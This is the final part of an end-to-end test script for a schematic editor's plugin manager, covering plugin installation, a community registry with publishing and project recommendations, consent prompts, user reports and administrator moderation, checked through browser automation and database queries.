check('uninstall removes it from the account', (await db.query('SELECT count(*)::int AS n FROM plugins WHERE user_id = $1 AND identifier = $2', [dana, ID('bom-export')])).rows[0].n === 0);
await closeManager(a);
await a.reload(); await editorReady(a); await running(a, ID('placement'));
check('installed plugins come back after a reload', (await plug(a)).installed.length === 6 && (await frames(a)) === 6, `${(await plug(a)).installed.length} installed, ${await frames(a)} frames`);

// ---- the manager is reachable from the home page, where nothing runs
await a.goto(`${BASE}/`); await a.waitForSelector('#homePlugins', { timeout: 15000 });
await a.click('#homePlugins'); await a.waitForSelector('#pluginManager #pluginList');
check('the home page opens the manager', (await a.locator('#pluginList li').count()) === 6 && (await a.locator('#pluginManager').isVisible()));
check('no plugin runs outside a project', Object.keys((await plug(a)).running).length === 0);
await shot(a, '15-home-manager');
await closeManager(a);

const tok = mintJwt(dana, 'plug-dana'); const hdr = { 'Content-Type': 'application/json', Authorization: `Bearer ${tok}` };
const manifest = { identifier: 'test.srv', name: 'S', description: '', runtime: { type: 'web', entrypoint: 'main.js' }, permissions: ['design:read'] };
const put = (id, body, h = hdr) => fetch(`${BASE}/api/plugins/${id}`, { method: 'PUT', headers: h, body: JSON.stringify(body) }).then((r) => r.status);
check('the store refuses a grant the manifest does not ask for', (await put('test.srv', { manifest, files: { 'main.js': '' }, granted: ['design:write'] })) === 400);
check('the store refuses a desktop plugin', (await put('test.srv', { manifest: { ...manifest, runtime: { type: 'python' } }, files: { 'main.js': '' }, granted: [] })) === 400);
check('the store refuses a mismatched identifier and bad paths', (await put('test.other', { manifest, files: { 'main.js': '' }, granted: [] })) === 400 && (await put('test.srv', { manifest, files: { 'main.js': '', '../x.js': '' }, granted: [] })) === 400);
check('the store needs a sign-in', (await put('test.srv', { manifest, files: { 'main.js': '' }, granted: [] }, { 'Content-Type': 'application/json' })) === 401);
const leeList = await fetch(`${BASE}/api/plugins`, { headers: { Authorization: `Bearer ${mintJwt(lee, 'plug-lee')}` } }).then((r) => r.json());
check("one person's plugins are not another's", leeList.plugins.length === 0);

// ---- publishing to the community registry, and what a project recommends
const as = (id, login) => ({ 'Content-Type': 'application/json', Authorization: `Bearer ${mintJwt(id, login)}` });
const call = (method, url, h, body) => fetch(`${BASE}${url}`, { method, headers: h, body: body ? JSON.stringify(body) : undefined });
const stored = (page) => page.evaluate(() => { const s = window.KcPlugins.store.get(); return { project: s.project, registry: s.registry, published: s.published, sources: Object.fromEntries(s.installed.map((p) => [p.identifier, p.source])) }; });
await a.goto(`${BASE}/p/${projectId}/edit?doc=${docs['ecc83-pp.kicad_sch']}`); await editorReady(a); await running(a, WRITER);
check('a project recommends nothing to start with', (await stored(a)).project.plugins.length === 0 && (await a.locator('#pluginRecommended').count()) === 0);
await menu(a, 'tools', 'External Plugins', 'pluginManager'); await a.waitForSelector('#pluginManager');
await a.click(`#pluginList [data-plugin="${WRITER}"]`); await a.waitForSelector('#pluginShare #pluginPublish');
check('a private plugin cannot be recommended until it is published', await a.locator('#pluginRecommend').isDisabled());
a.once('dialog', (d) => d.accept()); await a.click('#pluginPublish'); await a.waitForSelector('#pluginUnpublish');
const row = (await db.query('SELECT owner_id, manifest FROM plugin_registry WHERE identifier = $1', [WRITER])).rows[0];
check('publishing lists the plugin under the publisher', !!row && row.owner_id === dana && row.manifest.version === '0.1.0');
check('publishing installs it for nobody', (await db.query('SELECT count(*)::int AS n FROM plugins WHERE identifier = $1 AND user_id <> $2', [WRITER, dana])).rows[0].n === 1 /* vic loaded their own copy earlier */);
await a.click('#pluginRecommend');
await a.waitForFunction((i) => window.KcPlugins.store.get().project.plugins.some((r) => r.identifier === i), WRITER);
await shot(a, '16-publish-and-recommend');
await a.click(`#pluginList [data-plugin="${ID('design-stats')}"]`); await a.waitForSelector('#pluginRecommend');
check('a catalog plugin offers recommending but not publishing', (await a.locator('#pluginPublish').count()) === 0);
await a.click('#pluginRecommend');
await a.waitForFunction(() => window.KcPlugins.store.get().project.plugins.length === 2);
check('recommendations are stored with the project', (await db.query('SELECT identifier, origin FROM project_plugins WHERE project_id = $1 ORDER BY identifier', [projectId])).rows.map((r) => `${r.identifier}:${r.origin}`).join(' ') === `${ID('design-stats')}:catalog ${WRITER}:registry`);
await a.click('#pluginManager [data-tab="project"]'); await a.waitForSelector('#pluginProject .plg-card');
check("the project tab lists them, already installed for the recommender", (await a.locator('#pluginProject .plg-card').count()) === 2 && (await a.locator('#pluginProject [data-install]').count()) === 0 && (await a.locator('#pluginProject [data-unrecommend]').count()) === 2);
await closeManager(a);
check('the recommender is not nagged about plugins they have', (await a.locator('#pluginRecommended').count()) === 0);

const wm = { identifier: WRITER, name: 'Writer', description: 'x', version: '0.9.0', runtime: { type: 'web', entrypoint: 'main.js' } };
check('an identifier belongs to whoever published it first', (await call('PUT', `/api/plugins/registry/${WRITER}`, as(lee, 'plug-lee'), { manifest: wm, files: { 'main.js': '' } })).status === 409 && (await call('DELETE', `/api/plugins/registry/${WRITER}`, as(lee, 'plug-lee'))).status === 404);
check('the built-in catalog cannot be published over', (await call('PUT', `/api/plugins/registry/${ID('fake')}`, as(lee, 'plug-lee'), { manifest: { ...wm, identifier: ID('fake') }, files: { 'main.js': '' } })).status === 400);
check('publishing needs a version and a sign-in', (await call('PUT', '/api/plugins/registry/test.nover', as(lee, 'plug-lee'), { manifest: { ...wm, identifier: 'test.nover', version: undefined }, files: { 'main.js': '' } })).status === 400 && (await call('PUT', '/api/plugins/registry/test.anon', { 'Content-Type': 'application/json' }, { manifest: { ...wm, identifier: 'test.anon' }, files: { 'main.js': '' } })).status === 401);
check('only editors change what a project recommends', (await call('PUT', `/api/projects/${projectId}/plugins/${ID('bom-export')}`, as(vic, 'plug-vic'), { origin: 'catalog' })).status === 403 && (await call('DELETE', `/api/projects/${projectId}/plugins/${WRITER}`, as(vic, 'plug-vic'))).status === 403);
check('a private plugin cannot be recommended', (await call('PUT', `/api/projects/${projectId}/plugins/${PROBE}`, as(dana, 'plug-dana'), { origin: 'registry' })).status === 400 && (await call('PUT', `/api/projects/${projectId}/plugins/${PROBE}`, as(dana, 'plug-dana'), { origin: 'catalog' })).status === 400);
check('people outside the project do not see its recommendations', (await call('GET', `/api/projects/${projectId}/plugins`, as(out, 'plug-out'))).status === 403);
const seen = await (await call('GET', `/api/projects/${projectId}/plugins`, as(vic, 'plug-vic'))).json();
check('a viewer sees them and cannot edit them', seen.plugins.length === 2 && seen.canEdit === false);
const found = async (q) => (await (await call('GET', `/api/plugins/registry?q=${encodeURIComponent(q)}`, {})).json()).plugins;
check('the registry is searchable and lists no files', (await found('writ')).length === 1 && (await found('plug-dana')).length === 1 && (await found('zz%zz')).length === 0 && (await found('_')).length === 0 && !('files' in (await found(''))[0]));

// the collaborator: shown the recommendations, nothing installed or run until they choose
const c = await open('plug-lee', lee, `/p/${projectId}/edit?doc=${docs['ecc83-pp.kicad_sch']}`);
await editorReady(c); await c.waitForSelector('#pluginRecommended');
check('a collaborator is told, and nothing is installed or run for them', /recommends 2 plugins/.test(await c.locator('#pluginRecommended').innerText()) && (await plug(c)).installed.length === 0 && (await frames(c)) === 0);
await shot(c, '17-collaborator-sees-recommendation');
await c.click('#pluginRecommendedShow'); await c.waitForSelector('#pluginProject .plg-card');
check('the notice opens the project tab', (await c.locator('#pluginProject .plg-card').count()) === 2 && (await c.locator('#pluginProject [data-install]').count()) === 2);
await shot(c, '18-project-tab');
await c.click(`#pluginProject [data-install="${WRITER}"]`); await c.waitForSelector('#pluginConsent');
const sheet = await c.locator('#pluginConsent').innerText();
check('consent says who published it and that it is not reviewed', /published by plug-dana/.test(sheet) && /not reviewed/.test(sheet) && /Change your designs/.test(sheet) && (await plug(c)).installed.length === 0);
await shot(c, '19-registry-consent');
await accept(c, WRITER);
check('installed from the registry for that person only', (await stored(c)).sources[WRITER] === 'registry:plug-dana' && (await frames(c)) === 1);
await c.click('#pluginManager [data-tab="catalog"]'); await c.waitForSelector('#pluginRegistry .plg-card');
await c.waitForFunction(() => /1 install\b/.test(document.querySelector('#pluginRegistry')?.textContent || ''), null, { timeout: 5000 }).catch(() => {});
const card = await c.locator(`#pluginRegistry [data-plugin="${WRITER}"]`).innerText();
check('the catalog has a community section with publisher and installs', /by plug-dana/.test(card) && /1 install\b/.test(card) && /Installed/.test(card), card);
await c.fill('#pluginSearch', 'nothing-like-this'); await c.waitForSelector('#pluginRegistryEmpty');
await c.fill('#pluginSearch', 'writer'); await c.waitForSelector('#pluginRegistry .plg-card');
check('searching the community section filters it', (await c.locator('#pluginRegistry .plg-card').count()) === 1);
await c.locator('#pluginRegistry').evaluate((el) => el.scrollIntoView({ block: 'start' })); await c.waitForTimeout(200);
await shot(c, '20-community');
check('a new version is offered as an update', (await call('PUT', `/api/plugins/registry/${WRITER}`, as(dana, 'plug-dana'), { manifest: { ...wm, version: '0.2.0' }, files: { 'main.js': 'console.log("v2")' } })).status === 200
  && (await c.fill('#pluginSearch', ''), await c.waitForFunction(() => /Update…/.test(document.querySelector('#pluginRegistry')?.textContent || ''), null, { timeout: 5000 }).then(() => true, () => false)));
await closeManager(c);
check('the notice counts only what is still missing', /recommends a plugin/.test(await c.locator('#pluginRecommended').innerText()));
await c.click('#pluginRecommendedDismiss');
check('the notice can be dismissed', (await c.locator('#pluginRecommended').count()) === 0);
await c.reload(); await editorReady(c); await running(c, WRITER); await c.waitForTimeout(600);
check('and stays dismissed', (await c.locator('#pluginRecommended').count()) === 0 && (await stored(c)).project.plugins.length === 2);

// ---- reports and moderation: anyone can report, the administrators (KC_ADMINS) decide
await c.evaluate(() => window.KcPlugins.openManager('catalog')); await c.waitForSelector(`#pluginRegistry [data-report="${WRITER}"]`);
await c.click(`#pluginRegistry [data-report="${WRITER}"]`);
await c.fill(`[data-report-reason="${WRITER}"]`, 'It moved my resistors without asking and I do not trust it.');
await c.click(`[data-report-send="${WRITER}"]`); await c.waitForSelector(`[data-reported="${WRITER}"]`);
check('a collaborator can report a published plugin', (await db.query('SELECT count(*)::int AS n FROM plugin_reports WHERE identifier = $1 AND reporter_id = $2 AND resolved_at IS NULL', [WRITER, lee])).rows[0].n === 1);
check('non-administrators see no moderation tab', (await c.locator('#pluginManager [data-tab="moderation"]').count()) === 0);
await shot(c, '21-reported'); await closeManager(c);
const rep = (h, reason) => call('POST', `/api/plugins/registry/${WRITER}/report`, h, { reason });
check('reporting needs a sign-in and a reason', (await rep({ 'Content-Type': 'application/json' }, 'a long enough reason here')).status === 401 && (await rep(as(vic, 'plug-vic'), 'bad')).status === 400 && (await call('POST', '/api/plugins/registry/test.none/report', as(vic, 'plug-vic'), { reason: 'a long enough reason here' })).status === 404);
const mod = (h, id, action, reason = '') => call('POST', `/api/plugins/registry/${id}/moderate`, h, { action, reason });
check('only administrators moderate', (await call('GET', '/api/plugins/moderation', as(dana, 'plug-dana'))).status === 403 && (await mod(as(dana, 'plug-dana'), WRITER, 'hide', 'because I can')).status === 403 && (await mod(as(out, 'plug-out'), WRITER, 'hide', '')).status === 400);
const d = await open('plug-out', out, '/'); await d.waitForSelector('#homePlugins', { timeout: 15000 }); await d.click('#homePlugins');
await d.waitForSelector('#pluginManager [data-tab="moderation"]'); await d.click('#pluginManager [data-tab="moderation"]'); await d.waitForSelector(`#pluginModeration [data-plugin="${WRITER}"]`);
const modCard = d.locator(`#pluginModeration [data-plugin="${WRITER}"]`);
check('the administrator sees the report and who made it', /plug-lee/.test(await modCard.innerText()) && /moved my resistors/.test(await modCard.innerText()) && /by plug-dana/.test(await modCard.innerText()) && (await modCard.locator('[data-mod="hide"]').isDisabled()));
await d.fill(`[data-mod-reason="${WRITER}"]`, 'Changes designs in ways it does not describe.');
await shot(d, '22-moderation');
await modCard.locator('[data-mod="hide"]').click(); await d.waitForFunction((i) => (window.KcPlugins.store.get().moderation || []).some((e) => e.identifier === i && e.status === 'hidden'), WRITER);
const leeCopy = async () => (await db.query('SELECT enabled, withdrawn FROM plugins WHERE identifier = $1 AND user_id = $2', [WRITER, lee])).rows[0];
check('hiding takes it out of the registry and out of project recommendations', (await found('writ')).length === 0 && (await db.query("SELECT count(*)::int AS n FROM project_plugins WHERE identifier = $1", [WRITER])).rows[0].n === 0);
const hiddenGet = await (await call('GET', `/api/plugins/registry/${WRITER}`, {})).json();
check('a hidden plugin cannot be fetched, republished or unpublished around the decision', hiddenGet.status === 'hidden' && !('files' in hiddenGet) && (await call('PUT', `/api/plugins/registry/${WRITER}`, as(dana, 'plug-dana'), { manifest: { ...wm, version: '0.3.0' }, files: { 'main.js': '' } })).status === 403 && (await call('DELETE', `/api/plugins/registry/${WRITER}`, as(dana, 'plug-dana'))).status === 404);
check('copies installed from the registry are switched off and say why; private copies are left alone', (await leeCopy()).enabled === false && /does not describe/.test((await leeCopy()).withdrawn)
  && (await db.query('SELECT enabled, withdrawn FROM plugins WHERE identifier = $1 AND user_id = $2', [WRITER, dana])).rows[0].withdrawn === null);
check('the report is settled', (await db.query('SELECT count(*)::int AS n FROM plugin_reports WHERE identifier = $1 AND resolved_at IS NULL', [WRITER])).rows[0].n === 0);
await c.reload(); await editorReady(c); await c.waitForTimeout(800);
check('the withdrawn copy no longer runs', (await frames(c)) === 0 && !(await plug(c)).running[WRITER]);
await c.evaluate(() => window.KcPlugins.openManager('installed')); await c.waitForSelector('#pluginWithdrawn');
check('its owner is told what happened and why', /does not describe/.test(await c.locator('#pluginWithdrawn').innerText()) && !(await c.locator('#pluginEnabled').isChecked()));
await shot(c, '23-withdrawn'); await closeManager(c);
await menu(a, 'tools', 'External Plugins', 'pluginManager'); await a.waitForSelector('#pluginManager');
await a.click('#pluginManager [data-tab="installed"]'); await a.click(`#pluginList [data-plugin="${WRITER}"]`); await a.waitForSelector('#pluginModerated');
check('the publisher is told too, and cannot publish over it', /hid your listing: Changes designs/.test(await a.locator('#pluginModerated').innerText()) && (await a.locator('#pluginPublish').count()) === 0 && (await a.locator('#pluginRecommend').isDisabled()));
await closeManager(a);
await d.locator(`#pluginModeration [data-plugin="${WRITER}"] [data-mod="restore"]`).click();
await d.waitForFunction((i) => !(window.KcPlugins.store.get().moderation || []).some((e) => e.identifier === i), WRITER);
check('restoring lists it again and lifts the notice, without switching anything back on', (await found('writ')).length === 1 && (await leeCopy()).withdrawn === null && (await leeCopy()).enabled === false);
const bm = { identifier: 'test.bad', name: 'Bad', description: 'x', version: '1.0.0', runtime: { type: 'web', entrypoint: 'main.js' } };
await call('PUT', '/api/plugins/registry/test.bad', as(lee, 'plug-lee'), { manifest: bm, files: { 'main.js': 'console.log(1)' } });
check('removing is for good: files dropped, identifier kept from reuse', (await mod(as(out, 'plug-out'), 'test.bad', 'remove', 'Malware.')).status === 200 && (await found('bad')).length === 0
  && JSON.stringify((await db.query("SELECT files, status FROM plugin_registry WHERE identifier = 'test.bad'")).rows[0]) === JSON.stringify({ files: {}, status: 'removed' })
  && (await call('PUT', '/api/plugins/registry/test.bad', as(lee, 'plug-lee'), { manifest: bm, files: { 'main.js': '' } })).status === 403 && (await mod(as(out, 'plug-out'), 'test.bad', 'restore')).status === 400);
await d.close();

// unpublish: the registry and the recommendation go, installed copies stay
await menu(a, 'tools', 'External Plugins', 'pluginManager'); await a.waitForSelector('#pluginManager');
await a.click('#pluginManager [data-tab="installed"]'); await a.click(`#pluginList [data-plugin="${WRITER}"]`); await a.waitForSelector('#pluginUnpublish');
check('the publisher is offered to publish their newer or older copy', (await a.locator('#pluginPublish').count()) === 1);
a.once('dialog', (d) => d.accept()); await a.click('#pluginUnpublish'); await a.waitForSelector('#pluginShare #pluginPublish:has-text("Publish…")');
check('unpublishing removes it from the registry and from projects', (await db.query('SELECT count(*)::int AS n FROM plugin_registry WHERE identifier = $1', [WRITER])).rows[0].n === 0 && (await stored(a)).project.plugins.length === 1
  && (await db.query('SELECT count(*)::int AS n FROM project_plugins WHERE project_id = $1', [projectId])).rows[0].n === 1);
check('people who installed it keep their copy', (await db.query('SELECT count(*)::int AS n FROM plugins WHERE identifier = $1 AND user_id = $2', [WRITER, lee])).rows[0].n === 1);
await a.click('#pluginManager [data-tab="project"]'); await a.waitForSelector('#pluginProject .plg-card');
await a.click(`#pluginProject [data-unrecommend="${ID('design-stats')}"]`); await a.waitForSelector('#pluginProjectEmpty');
check('an editor can stop recommending', (await db.query('SELECT count(*)::int AS n FROM project_plugins WHERE project_id = $1', [projectId])).rows[0].n === 0);
await closeManager(a); await c.close();

check('no page errors', errors.length === 0, errors.slice(0, 4).join(' | '));
await browser.close(); await db.end();
fs.rmSync(tmp, { recursive: true, force: true });
console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
